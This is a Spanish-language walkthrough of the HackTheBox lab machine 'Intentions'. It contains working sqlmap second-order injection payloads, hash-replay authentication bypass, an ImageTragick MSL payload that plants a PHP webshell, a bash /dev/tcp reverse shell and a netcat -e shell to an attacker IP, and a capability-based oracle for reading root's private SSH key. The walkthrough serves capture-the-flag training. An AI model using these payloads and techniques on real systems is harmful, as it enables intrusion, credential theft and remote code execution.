# Intentions - HackTheBox

**Fecha de resolución:** 28 de septiembre - 1 de octubre de 2026

Máquina Linux, IP 10.129.229.27. El sitio en el puerto 80 es "Intentions", una galería de fotos con una API en Laravel detrás.

## Reconocimiento

Escaneo completo de puertos:

```
nmap 10.129.229.27 -p- -n -sS --min-rate 5000 -vvv -oG allPorts
nmap 10.129.229.27 -p22,80 -sS -sCV -n -oN targets1
```

Dos puertos abiertos: 22 (OpenSSH 8.9p1) y 80 (nginx 1.18.0, título "Intentions").

## Enumeración web

Fuzzing de directorios sobre la raíz:

```
gobuster dir -u http://10.129.229.27/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,bak --exclude-length 0
```

```
index.php           (Status: 200) [Size: 1523]
gallery              (Status: 302) [--> http://10.129.229.27]
admin                (Status: 302) [--> http://10.129.229.27]
storage              (Status: 301) [--> http://10.129.229.27/storage/]
robots.txt           (Status: 200) [Size: 24]
```

`gallery` y `admin` redirigen a la raíz si no hay sesión. Antes de centrarme en la app probé `searchsploit activemq` y `searchsploit nginx 1.18.0` por costumbre; nada aplicable (ningún CVE de esa versión concreta de nginx tiene PoC usable aquí).

Navegando la galería con Burp detrás capturé el tráfico de la API: la app deja marcar "géneros" favoritos y luego pide un feed personalizado con ellos.

```
POST /api/v1/gallery/user/genres   {"genres":"food"}
GET  /api/v1/gallery/user/feed
```

Guardé ambas peticiones (`updaterequest.txt`, `getrequest.txt`) para sqlmap.

## Inyección SQL de segundo orden en `genres`

Primer intento directo contra el endpoint de guardado, sin éxito:

```
sqlmap -r request.txt --level 5 --risk 3 --batch
[WARNING] (custom) POST parameter 'JSON genres' does not seem to be injectable
```

El parámetro no se refleja en la misma respuesta: `genres` se guarda en esa petición, pero la consulta que realmente lo usa corre en la siguiente llamada al feed. Hasta que no encadené las dos peticiones con `--second-req` no hubo señal de inyección, y aun así sqlmap seguía sin confirmar nada hasta añadir `--tamper=space2comment` (la app filtra espacios literales en el valor del campo):

```
sqlmap -r updaterequest.txt --second-req=getrequest.txt --batch --tamper=space2comment --level 5 --risk 3
```

Con eso, sqlmap confirma inyección booleana ciega, basada en tiempo y por UNION (5 columnas), en una cadena entre paréntesis:

```
Payload: {"genres":"food') AND 8984=8984 AND ('AZnO'='AZnO"}
Payload: {"genres":"food') UNION ALL SELECT NULL,CONCAT(...),NULL,NULL,NULL#"}
```

Enumeración de la base:

```
sqlmap ... --dbs                                    -> information_schema, intentions
sqlmap ... -D intentions --tables                    -> gallery_images, migrations, personal_access_tokens, users
sqlmap ... -D intentions -T users --columns --dump
sqlmap ... -D intentions -T personal_access_tokens --dump   -> [0 entries]
```

La tabla `personal_access_tokens` vino vacía, sin nada que aprovechar. `users` dio 28 filas con hash bcrypt, incluidos dos administradores:

```
steve@intentions.htb:$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa
greg@intentions.htb:$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m
```

Probé a crackear ambos hashes con rockyou antes de seguir:

```
hashcat -m 3200 adminshash.txt /usr/share/wordlists/rockyou.txt --username
Recovered........: 0/2 (0.00%) Digests (total)
```

Sin suerte, bcrypt + rockyou no dio nada.

## Bypass de autenticación en /api/v2/auth/login

Siguiendo explorando la app descubrí que existe una versión `v2` del login. Un intento con email y password cualquiera devuelve un error que delata el diseño del endpoint:

```
POST /api/v2/auth/login   {"email":"test@asdsad.com","password":"12345"}
422 {"status":"error","errors":{"hash":["The hash field is required."]}}
```

El v2 no pide una contraseña en texto plano, pide directamente un hash. Como ya tenía el hash bcrypt de steve sacado por la inyección, lo mandé tal cual:

```
POST /api/v2/auth/login   {"email":"steve@intentions.htb","hash":"$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa"}
200 {"status":"success","name":"steve"}
```

Login como administrador sin necesidad de crackear nada: basta con reenviar el hash dumpeado de la base de datos.

## RCE vía ImageMagick (ImageTragick)

Ya autenticado como `steve`, revisé la parte de administración de imágenes de la galería. `searchsploit imagick` solo devuelve un bypass de `disable_functions` para PHP 5.4 que no aplica aquí, pero confirma que el backend procesa las imágenes con la extensión Imagick de PHP. Monté el clásico payload de ImageTragick (CVE-2016-3714) usando los pseudo-protocolos `caption:` e `info:` de ImageMagick para leer una cadena arbitraria y escribirla en disco:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php @passthru(@$_REQUEST['c']); ?&gt;" />
<write filename="info:/var/www/html/intentions/storage/app/public/rce.php" />
</image>
```

Subí ese `payload.msl` como si fuera la imagen a través de la gestión de imágenes del panel de administración. Al procesarlo, ImageMagick escribe la webshell en `storage/app/public/rce.php`.

Preparé una reverse shell en base64 y la serví por HTTP, con un listener (`penelope`) en el puerto 4444:

```
echo "bash -i >& /dev/tcp/10.10.14.224/4444 0>&1" | base64 > reverse
python3 -m http.server 80
penelope
```

Disparando la reverse shell a través del parámetro `c` de `rce.php` cayó la conexión como `www-data`, con PTY auto-mejorada por penelope.

## Acceso como www-data y credencial de greg en el historial de git

Como `www-data`, `sudo -l` y `crontab -l` no dieron nada (ambos sin permisos/vacíos). El código de la app está en `/var/www/html/intentions`, con un `.git` completo ahí mismo. En vez de intentar clonarlo por HTTP, lo bajé directamente con el comando `download` de penelope:

```
(Penelope)─(Session [1])> download .git
```

Con el historial completo en local pero sin el árbol de trabajo, busqué referencias a la subida de imágenes en todo el log de commits:

```
git log -p | grep upload
```

Entre los commits antiguos apareció uno (`tests/Feature/Helper.php`, antes de que greg cambiara el helper de tests a una factory de usuarios) con credenciales de admin en texto plano, dejadas ahí como fixture de pruebas:

```php
$res = $test->postJson('/api/v1/auth/login', [
    'email' => 'greg@intentions.htb',
    'password' => 'Gr3g1sTh3B3stDev3l0per!1998!'
]);
```

Esa contraseña, nunca rotada, es la real de la cuenta `greg` del sistema (el hashcat contra rockyou había fallado antes precisamente porque la contraseña no estaba en ese diccionario).

```
ssh greg@10.129.229.27
```

Acceso confirmado como `greg`, con `user.txt` en su home.

## Escalada a root

> Nota: esta parte la reconstruí en parte apoyándome en otro writeup público de la máquina, no llegué sola/o a identificar de entrada la técnica exacta sobre el binario `scanner`.

Como `greg`, `sudo -l` y `crontab -l` no dieron nada, `/etc/cron.d` solo tiene la limpieza de sesiones de PHP de serie, y un barrido de SUID (`find / -perm -04000`) solo lista binarios estándar del sistema. Un intento de abrir una segunda shell con `busybox nc 10.10.14.224 4445 -e bash` murió sin más. Con `linpeas.sh` y `pspy64` ya presentes en `/tmp` tampoco salió nada interesante vigilando procesos.

Lo que sí tenía desde el primer `ls` en el home era esto:

```
greg@intentions:~$ cat dmca_check.sh
/opt/scanner/scanner -d /home/legal/uploads -h /home/greg/dmca_hashes.test
greg@intentions:~$ id
uid=1001(greg) gid=1001(greg) groups=1001(greg),1003(scanner)
greg@intentions:~$ ls -l /opt/scanner/scanner
-rwxr-x--- 1 root scanner 1437696 Jun 19  2023 /opt/scanner/scanner
```

`scanner` es un binario Go estático que compara el hash de un fichero contra una lista `LABEL:MD5`. `getcap` revela por qué importa:

```
greg@intentions:~$ getcap /opt/scanner/scanner
/opt/scanner/scanner cap_dac_read_search=ep
```

Con `cap_dac_read_search`, el binario puede leer cualquier fichero del sistema saltándose los permisos normales, aunque lo ejecute `greg`. Sus opciones (`scanner --help`) incluyen `-c` (fichero a comprobar), `-h` (lista de hashes) y `-l` (límite de bytes a hashear, 500 por defecto). Combinando `-c /root/.ssh/id_rsa` con un `-h` propio de una sola línea y jugando con `-l`, el binario se convierte en un oráculo: le paso un hash candidato para los primeros N bytes del fichero objetivo, y si imprime `[+]` es que coincide.

Para el script que automatiza esto me apoyé en una IA en vez de escribirlo entero a mano: le pasé la idea del oráculo y las opciones de `scanner --help` y fui iterando con ella hasta dejarlo funcional. El resultado va probando byte a byte: por cada posición nueva, prueba los 256 valores posibles añadidos al prefijo ya confirmado, calcula el MD5 de ese intento, lo escribe en un fichero de hashes temporal y llama a `scanner -c /root/.ssh/id_rsa -h <temporal> -l <longitud del intento>`; si la salida contiene `[+]`, el byte es correcto y se pasa al siguiente.

La primera versión (restringida al charset imprimible) recuperó un bloque que parecía una clave OpenSSH completa, pero no cargaba:

```
greg@intentions:/tmp$ ssh root@localhost -i id_rsa_recuperada
Load key "id_rsa_recuperada": error in libcrypto
```

Reescribí el script (`nuevo.py`) partiendo del prefijo ya confirmado pero probando el rango completo de bytes (0-255) en vez de solo caracteres imprimibles, y dejándolo correr hasta que no hubiera coincidencia en ningún byte, señal de haber llegado al final real de la clave (se detuvo en el byte 604). Con esa clave completa:

```
greg@intentions:/tmp$ chmod 600 id_rsa_recuperada
greg@intentions:/tmp$ ssh root@localhost -i id_rsa_recuperada
root@intentions:~# whoami
root
root@intentions:~# cat root.txt
```

Acceso como root confirmado, flag capturada.

---

- GitHub: [github.com/germanvegaa](https://github.com/germanvegaa)
- TryHackMe: [tryhackme.com/p/G3RM4N](https://tryhackme.com/p/G3RM4N)
- HackTheBox: [app.hackthebox.com/public/users/3990132](https://app.hackthebox.com/public/users/3990132)
